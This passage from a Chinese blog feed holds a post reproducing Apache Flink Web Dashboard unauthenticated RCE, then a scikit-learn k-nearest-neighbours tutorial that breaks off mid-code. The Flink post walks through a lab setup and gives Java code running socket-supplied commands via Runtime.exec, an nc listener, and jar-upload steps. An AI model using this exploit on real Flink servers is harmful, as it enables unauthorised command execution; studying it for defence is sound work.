123456</span><br></pre></td></tr></table></figure></p><p>其中 <code>pwd</code> 参数可以不填默认为空，但不推荐。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://paper.seebug.org/1091/#rmi" target="_blank" rel="noopener">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></li><li><a href="https://github.com/0nise/shell-plus" target="_blank" rel="noopener">https://github.com/0nise/shell-plus</a></li><li><a href="https://blog.csdn.net/wubinghai/article/details/82951769" target="_blank" rel="noopener">浅谈RMI</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 服务管理 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flink 命令执行</title>
      <link href="/posts/ba4a62fc/"/>
      <url>/posts/ba4a62fc/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Flink 核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。基于流执行引擎，Flink 提供了诸多更高抽象层的 API 以便用户编写分布式任务：</p><ul><li><p>DataSet API： 对静态数据进行批处理操作，将静态数据抽象成分布式的数据集，用户可以方便地使用Flink提供的各种操作符对分布式数据集进行处理，支持Java、Scala和Python。</p></li><li><p>DataStream API： 对数据流进行流处理操作，将流式的数据抽象成分布式的数据流，用户可以方便地对分布式数据流进行各种操作，支持Java和Scala。</p></li><li><p>Table API：对结构化数据进行查询操作，将结构化数据抽象成关系表，并通过类SQL的DSL对关系表进行各种查询操作，支持Java和Scala。</p></li></ul><h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><p>本次漏洞情况是由于 Apache Flink Web Dashboard 未授权访问，上传恶意jar导致远程代码命令执行。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>环境要求：JDK 8<br>官网下载地址：<a href="http://flink.apache.org/downloads.html" target="_blank" rel="noopener">http://flink.apache.org/downloads.html</a><br>或者通过<code>wget</code>进行下载：<br><code>wget https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</code><br>然后进行解压：<br><code>tar zxvf flink-1.9.1-bin-scala_2.11.tgz</code><br>然后启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd f flink-1.9.1-bin-scala_2.11/bin</span><br><span class="line">./start-cluster.sh</span><br></pre></td></tr></table></figure></p><p>最后访问本机：<a href="http://localhost:8081/" target="_blank" rel="noopener">http://localhost:8081/</a> 如果可以正常访问表示安装成功。</p><p><img src="https://img.zhiiyun.com/10ef8baedd9ff8e65a165e06ee433fd0" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Flink 可以通过上传 jar 的方式来进行执行任务，我们可以构造利用代码进行上传执行。</p><h3 id="添加-Archetype"><a href="#添加-Archetype" class="headerlink" title="添加 Archetype"></a>添加 Archetype</h3><p><img src="https://img.zhiiyun.com/c391b91039834335a4ba85371d6d78f4" alt=""></p><p>添加 Archetype：</p><ul><li>GroupId：org.apache.flink</li><li>ArtifactId：flink-quickstart-java</li><li>Version：1.9.0</li></ul><h3 id="创建任务项目"><a href="#创建任务项目" class="headerlink" title="创建任务项目"></a>创建任务项目</h3><p>基于添加的<code>flink-quickstart-java</code> 进行创建项目，然后点击 <code>Next</code></p><p><img src="https://img.zhiiyun.com/bcc8406714874b9f0bd0d1b3606dc451" alt="基于添加的`flink-quickstart-java` 进行创建项目" title="基于添加的`flink-quickstart-java` 进行创建项目"></p><p>设置项目<code>GroupId</code>以及<code>ArtifactId</code>，然后点击 <code>Next</code></p><p><img src="https://img.zhiiyun.com/f172c79aa57405a3ad43e3accb0ea623" alt="设置项目`GroupId`以及`ArtifactId`" title="设置项目`GroupId`以及`ArtifactId`"></p><p>配置项目maven，然后点击 <code>Next</code></p><p><img src="https://img.zhiiyun.com/193932e21347e18d986b17655818d302" alt="配置项目maven" title="配置项目maven"></p><p>设置项目名称以及项目路径，然后点击<code>Finish</code></p><p><img src="https://img.zhiiyun.com/a6998469cba3c3e9eaf242842ff6583f" alt="设置项目名称以及项目路径，然后点击`Finish`"></p><p>项目创建成功：</p><p><img src="https://img.zhiiyun.com/ff2a833a51f3e14e112d392f23da630d" alt=""></p><h3 id="编写任务"><a href="#编写任务" class="headerlink" title="编写任务"></a>编写任务</h3><p>创建 SocketTextStreamExecute 类写入一下代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    final StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    DataStreamSource&lt;String&gt; stream = env.socketTextStream(&quot;ip&quot;, 7777);</span><br><span class="line">    stream.flatMap(new LineSplitter());</span><br><span class="line">    env.execute(&quot;execute code&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static final class LineSplitter implements FlatMapFunction&lt;String, Tuple2&lt;String, Integer&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void flatMap(String s, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; collector) &#123;</span><br><span class="line">        String[] tokens = s.toLowerCase().split(&quot;\\W+&quot;);</span><br><span class="line">        for (String token : tokens) &#123;</span><br><span class="line">            if (token.length() &gt; 0) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Process p = Runtime.getRuntime().exec(token);</span><br><span class="line">                    //取得命令结果的输出流</span><br><span class="line">                    InputStream fis=p.getInputStream();</span><br><span class="line">                    //用一个读输出流类去读</span><br><span class="line">                    InputStreamReader isr=new InputStreamReader(fis);</span><br><span class="line">                    //用缓冲器读行</span><br><span class="line">                    BufferedReader br=new BufferedReader(isr);</span><br><span class="line">                    String line=null;</span><br><span class="line">                    //直到读完为止</span><br><span class="line">                    while((line=br.readLine())!=null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;token --&gt; &quot;+token);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后通过 <code>mvn clean package -DskipTests</code> 将代码编译为 jar 文件。</p><h3 id="执行任务"><a href="#执行任务" class="headerlink" title="执行任务"></a>执行任务</h3><p>开启NC 监听端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 7777</span><br></pre></td></tr></table></figure></p><p>将 jar 通过web上传到任务中心，然后将Entity Class 修改为 <code>com.r4v3zn.SocketTextStreamExecute</code> 点击 <code>Submit</code> 进行执行任务。</p><p><img src="https://img.zhiiyun.com/ab4c3128ad09e75f2e1e6146955fe836" alt=""></p><p>执行任务之后，我们监听到 NC 端口将响应信息：</p><p><img src="https://img.zhiiyun.com/7fa9075b49f3ab80dd3df8615f69f9c9" alt=""></p><p>执行命令 <code>ifconfig</code> 之后通过日志进行查看执行结果。</p><p><img src="https://img.zhiiyun.com/46beb1842640417bd1b23a01832b345b" alt=""></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>代码：<a href="https://github.com/0nise/scripts/tree/master/flinkrce" target="_blank" rel="noopener">https://github.com/0nise/scripts/tree/master/flinkrce</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习：K最近邻算法</title>
      <link href="/posts/517011b7/"/>
      <url>/posts/517011b7/</url>
      
        <content type="html"><![CDATA[<p>K最近邻（kNN，k-NearestNeighbor）也称近邻算法，主要用于数据挖掘分类技术中最简单常见的一种算法。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>K最近邻算法，就是K个最近的邻居的意思，每个样本数据都可以用它最接近的K个邻居来进行代表。</p><p><img src="https://img.zhiiyun.com/3ffe3c4ff55e4357ea89b2cad9cbc359" alt=""></p><p>通过上图中可以清晰的看出图中的数据分为两类，一类为红色一类为蓝色。现在需要我们确定出来绿色点的为哪一类颜色，可以根据绿色点临近的K个点进行来确认，当我们确认K数字为3是可以看出距离绿色点最近的分布为蓝色、红色、红色，那么就可以进行标记绿色点为红色。</p><p>关于K的取值是一个非常重要的，当我们K的数值选取较小的时候可能会导致数据分类出现巨大的错误，在scikit-learn中，K最近邻算法的K值是通过n_neighbors参数来进行调节设置，默认值为5。</p><p>K最近邻算法也可以用于回归，原理和其用于分类的是相同的。当我们使用K最近邻回归计算某个数据点的预测值时，模型会选择该数据最近的若干个训练数据集中的点，并且进行计算他们的y值取平均值，并且把该平均值作为新数据的预测值。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分类任务"><a href="#分类任务" class="headerlink" title="分类任务"></a>分类任务</h3><p>可以通过sicikit-learn进行手动生成数据集来使用K最近邻算法进行分类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="comment"># KNN 分类器</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">data = make_blobs(n_samples=<span class="number">200</span>, centers=<span class="number">2</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>使用<code>sklearn</code>中的<code>make_blobs</code>函数来进行生成数量为200的样本数据，将数据进行分成两类的数据集，然后将数据集赋值给 <code>x y</code>然后通过<code>matplotlib</code>将数据图形进行展示。</p><p><code>make_blobs</code> 函数是为聚类产生数据集，主要参数作用如下：</p><ul><li>n_samples 生成的样本数量</li><li>n_features 每个样本的特征数</li><li>centers 生成样本数量的分类数量</li><li>cluster_std 每个类别的平方差</li><li>random_state 随机种子</li></ul><p><img src="https://img.zhiiyun.com/dad0b6f4bddbaff42f931d51ce40af40" alt=""></p><p>上图可以看出通过<code>make_blobs</code>生成的数据分为两类，我们可以将这些数据用于算法进行模型的训练，然后针对新的或未知的数据分类或者回归。</p><p>接下来通过K最近邻算法来进行拟合这些数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据集</span></span><br><span class="line">data = make_blobs(n_samples=<span class="number">200</span>, centers=<span class="number">2</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line"><span class="comment"># 创建KNN分类器</span></span><br><span class="line">clf = KNeighborsClassifier()</span><br><span class="line">clf.fit(x, y)</span><br><span class="line"><span class="comment"># 绘制图</span></span><br><span class="line">x_min, x_max = x[:, <span class="number">0</span>].min() - <span class="number">1</span>, x[:, <span class="number">0</span>].max() + <span class="number">1</span></span><br><span class="line">y_min, y_max = x[:, <span class="number">1</span>].min() - <span class="number">1</span>, x[:, <span class="number">1</span>].max() + <span class="number">1</span></span><br><span class="line">xx, yy = np.meshgrid(np.arange(x_min, x_max, <span class="number">.02</span>),</span><br><span class="line">                     np.arange(y_min, y_max, <span class="number">.02</span>))</span><br><span class="line">z = clf.predict(np.c_[xx.ravel(), yy.ravel()])</span><br><span class="line">z = z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx, yy, z)</span><br><span class="line">plt.scatter(x[:, <span class="number">0</span>], x[:, <span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.xlim(xx.min(), xx.max())</span><br><span class="line">plt.ylim(yy.min(), yy.max())</span><br><span class="line">plt.title(<span class="string">"KNN"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>其中<code>np.meshgrid</code>用于生成网格坐标矩阵，具体生成方式如下图：</p><p><img src="https://img.zhiiyun.com/af28616207772601a8cee0c175e6ac8f" alt=""></p><p>执行代码，会出现以下结果：</p><p><img src="https://img.zhiiyun.com/ae1cbed0cbca92606cd3d809c1a1269a" alt=""></p><p>通过上述代码可以看到K最近邻算法基于生成的数据集创建了一个分类模型，将数据分成两部分使用不同的颜色进行区分，如果有新的数据进行输入，模型会自动将新数据进行分类到对应的类别中。</p><p>假设有一个新的数据点，特征值为<code>6.95</code>和<code>5.2</code>，进行试验模型是否可以将新的数据进行正确的分类，首先我们可以在<code>plt.show()</code>之前加入以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.scatter(<span class="number">6.95</span>, <span class="number">5.2</span>, marker=<span class="string">"*"</span>, c=<span class="string">'red'</span>, s=<span class="number">200</span>)</span><br></pre></td></tr></table></figure><p>再次运行程序，会出现下图：</p><p><img src="https://img.zhiiyun.com/5b977dc28f0b36cbb66a7d43dc5dd080" alt=""></p><p>图中<code>★</code>为新的数据位置，可以看到K最近邻算法将它放在了上方的区域，与上方的区域归为了一类。</p><p>通过代码进行验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'='</span>*<span class="number">30</span>)</span><br><span class="line">print(<span class="string">'新的数据点为：（6.95，5.2），分类结果为：'</span>, clf.predict([[<span class="number">6.95</span>, <span class="number">5.2</span>]]))</span><br><span class="line">print(<span class="string">'='</span>*<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://img.zhiiyun.com/753f12ebb79777febf938e7b86d54c4f" alt=""></p><h3 id="多元分类"><a href="#多元分类" class="headerlink" title="多元分类"></a>多元分类</h3><p>接下来我们来处理多元分类，为了将难度加大，修改<code>make_blobs</code>中的<code>centers</code>参数生成1,000个数据样本，数据类型扩展到10类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="comment"># KNN 分类器</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">data = make_blobs(n_samples=<span class="number">1000</span>, centers=<span class="number">10</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>运行程序，生成我们生成数据集展示图：</p><p><img src="https://img.zhiiyun.com/e5ce88940b2fd35a7657518be769c2b2" alt=""></p><p>可以看到新的数据被分成了10类，其中有3类数据有一些重合，然后通过K最近邻算法进行拟合数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据集</span></span><br><span class="line">data = make_blobs(n_samples=<span class="number">1000</span>, centers=<span class="number">10</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line"><span class="comment"># 创建KNN分类器</span></span><br><span class="line">clf = KNeighborsClassifier()</span><br><span class="line">clf.fit(x, y)</span><br><span class="line"><span class="comment"># 绘制图</span></span><br><span class="line">x_min, x_max = x[:, <span class="number">0</span>].min() - <span class="number">1</span>, x[:, <span class="number">0</span>].max() + <span class="number">1</span></span><br><span class="line">y_min, y_max = x[:, <span class="number">1</span>].min() - <span class="number">1</span>, x[:, <span class="number">1</span>].max() + <span class="number">1</span></span><br><span class="line">xx, yy = np.meshgrid(np.arange(x_min, x_max, <span class="number">.02</span>),</span><br><span class="line">                     np.arange(y_min, y_max, <span class="number">.02</span>))</span><br><span class="line">z = clf.predict(np.c_[xx.ravel(), yy.ravel()])</span><br><span class="line">z = z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx, yy, z)</span><br><span class="line">plt.scatter(x[:, <span class="number">0</span>], x[:, <span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.xlim(xx.min(), xx.max())</span><br><span class="line">plt.ylim(yy.min(), yy.max())</span><br><span class="line">plt.title(<span class="string">"KNN"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>运行程序会出现K最近邻算法拟合结果：</p><p><img src="https://img.zhiiyun.com/45e4d93cfec984e1acaedee45f64fb74" alt=""></p><p>可以看到K最近邻算法将大部分的数据点分类到正确的分类中，单有一部分小数据分入了错误的分类中，分类错误的数据基本为重合的数据点。</p><p>我们可以通过代码计算K最近邻算法的正确率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br><span class="line">print(<span class="string">"模型正确率：&#123;:2f&#125;"</span>.format(clf.score(x,y)))</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/bdf78879a4015168e5e87da33277061d" alt=""></p><p>可以看出将数据集样本提升到1,000条，分类提升到10中数据类型，模型的正确率为<code>91.7%</code>。</p><h2 id="回归分析"><a href="#回归分析" class="headerlink" title="回归分析"></a>回归分析</h2><p>通过scikit-learn中的<code>make_regression</code>进行生成用于回归分析的数据集。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_regression</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x, y = make_regression(n_features=<span class="number">1</span>, n_informative=<span class="number">1</span>, noise=<span class="number">50</span>, random_state=<span class="number">8</span>)</span><br><span class="line">plt.scatter(x, y, c=<span class="string">'orange'</span>, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>将样本的特征数量为1个，噪音为50，然后运行程序。</p><p><img src="https://img.zhiiyun.com/4c3892c54c52834239e3a85a7f30c5d6" alt=""></p><p>上图可以看到横轴（X轴）为样本的特征数值，大致范围在-3~3之间；纵轴（Y轴）为样本的测定值，大致范围在-250~250之间。</p><p>然后通过K最近邻算法来进行回归测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_regression</span><br><span class="line"><span class="comment"># KNN 回归模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x, y = make_regression(n_features=<span class="number">1</span>, n_informative=<span class="number">1</span>, noise=<span class="number">50</span>, random_state=<span class="number">8</span>)</span><br><span class="line">reg = KNeighborsRegressor()</span><br><span class="line"><span class="comment"># 使用 KNN 模型进行拟合数据</span></span><br><span class="line">reg.fit(x, y)</span><br><span class="line">z = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">200</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">plt.scatter(x, y, c=<span class="string">'orange'</span>, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.plot(z, reg.predict(z), c=<span class="string">'k'</span>, linewidth=<span class="number">3</span>)</span><br><span class="line">plt.title(<span class="string">'KNN Regressor'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>运行程序，生成拟合结果。</p><p><img src="https://img.zhiiyun.com/56424c861925cfcff174a47c6fb3cb0d" alt=""></p><p>从图中可以看出K最近邻算法拟合生成的数据，直观来看拟合结果并不是很好，有大量的数据点没有被覆盖到。</p><p>通过<code>score</code>来进行计算模型分数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br><span class="line">print(<span class="string">"模型正确率：&#123;:2f&#125;"</span>.format(reg.score(x, y)))</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/dd42583901f5425d85cc9ff679f9bed6" alt=""></p><p>看也看到模型的正确率只有<code>77.2%</code>，该结果比较差。为了提高正确率可以进行降低K最近邻算法的<code>n_neighbors</code>来提高准确率。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_regression</span><br><span class="line"><span class="comment"># KNN 回归模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x, y = make_regression(n_features=<span class="number">1</span>, n_informative=<span class="number">1</span>, noise=<span class="number">50</span>, random_state=<span class="number">8</span>)</span><br><span class="line">reg = KNeighborsRegressor(n_neighbors=<span class="number">2</span>)</span><br><span class="line">reg.fit(x, y)</span><br><span class="line">z = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">200</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">plt.scatter(x, y, c=<span class="string">'orange'</span>, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.plot(z, reg.predict(z), c=<span class="string">'k'</span>, linewidth=<span class="number">3</span>)</span><br><span class="line">plt.title(<span class="string">'KNN Regressor'</span>)</span><br><span class="line">plt.show()</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br><span class="line">print(<span class="string">"模型正确率：&#123;:2f&#125;"</span>.format(reg.score(x, y)))</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>代码通过将K最近邻算法的<code>n_neighbors</code>调整到2，运行程序，生成拟合结果以及模型争取率。</p><p><img src="https://img.zhiiyun.com/b5e000b0e2325dfb3d13adca1a1e49e5" alt=""></p><p><img src="https://img.zhiiyun.com/16138082733bac56f183238d15774f1d" alt=""></p><p>可以看到相对第一次来说覆盖的数据点变多，准确率从<code>77.2%</code>提升到<code>85.8%</code>。</p><h2 id="K最近邻算法实战-酒分类"><a href="#K最近邻算法实战-酒分类" class="headerlink" title="K最近邻算法实战-酒分类"></a>K最近邻算法实战-酒分类</h2><h3 id="数据集分析"><a href="#数据集分析" class="headerlink" title="数据集分析"></a>数据集分析</h3><p>数据集来自scikit-learn中内置的数据集来进行试验，该数据中在<code>datasets</code>模块中。</p><p>首先加载酒数据集到项目中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">print(win_dataset.keys())</span><br><span class="line">print(win_dataset[<span class="string">'DESCR'</span>])</span><br><span class="line">print(win_dataset[<span class="string">'data'</span>].shape)</span><br></pre></td></tr></table></figure><p>运行代码可以看到加载的数据。</p><p><img src="https://img.zhiiyun.com/32aae9b908f7ddfddcfac1759508f3b5" alt=""></p><p>可以看到数据集中主要有<code>&#39;data&#39;, &#39;target&#39;, &#39;target_names&#39;, &#39;DESCR&#39;, &#39;feature_names&#39;</code>，对应<code>数据,分类目标,分类名称,描述,特征名称</code>，以及178个样本数据，每条样本数据中有13个特征，主要分为3类（<code>class_0,class_1,class_2</code>），其中<code>class_0</code>有59个样本，<code>class_1</code>有71个样本，<code>class_2</code>中有48个样本。<br>特征主要包括酒精含量、苹果酸、镁含量、青花素含量、色彩饱和度等等。</p><h3 id="生成训练集和测试集"><a href="#生成训练集和测试集" class="headerlink" title="生成训练集和测试集"></a>生成训练集和测试集</h3><p>创建一个自动将酒分类的机器算法模型之前，需要能够对模型的可信度进行评判，否则我们无法知道针对新的酒进行的分类是否正确。</p><p>所以我们需要将数据集拆分为两部分：一部分称为训练集；另一部分为测试集。</p><p>使用scikit-learn中的<code>train_test_split</code>函数进行拆分数据集，该函数可以将数据集进行随机排列，默认情况下75%的数据以及对应的标签划分到训练集，25%的数据集划分到测试集中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(win_dataset[<span class="string">'data'</span>], win_dataset[<span class="string">'target'</span>], random_state=<span class="number">0</span>)</span><br><span class="line">print(<span class="string">'X_train shape:&#123;&#125;'</span>.format(X_train.shape))</span><br><span class="line">print(<span class="string">'X_test shape:&#123;&#125;'</span>.format(X_test.shape))</span><br><span class="line">print(<span class="string">'y_train 